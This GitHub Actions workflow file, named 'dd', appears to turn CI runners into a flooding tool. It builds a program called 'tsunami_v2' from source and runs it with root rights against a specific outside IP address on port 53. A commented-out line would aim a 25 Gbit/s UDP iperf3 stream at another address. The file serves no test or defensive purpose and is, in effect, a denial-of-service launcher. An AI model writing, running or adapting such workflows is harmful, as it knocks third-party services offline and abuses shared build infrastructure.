name: dd
on: workflow_dispatch
jobs:
  dd:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      #- run: iperf3 -u -b 25G -c 147.75.202.235
      - run: wget -qO- https://github.com/xpack-dev-tools/gcc-xpack/releases/download/v15.2.0-1/xpack-gcc-15.2.0-1-linux-x64.tar.gz | sudo tar -xz -C /opt/ && sudo update-alternatives --install /usr/bin/gcc gcc /opt/xpack-gcc-15.2.0-1/bin/gcc 100 && sudo update-alternatives --install /usr/bin/g++ g++ /opt/xpack-gcc-15.2.0-1/bin/g++ 100
      - run: gcc -Ofast -march=native -flto -funroll-loops -fomit-frame-pointer -fno-stack-protector -pthread -o tsunami_v2 tsunami_v2.c
      - run: sudo ./tsunami_v2 95.161.128.10 53
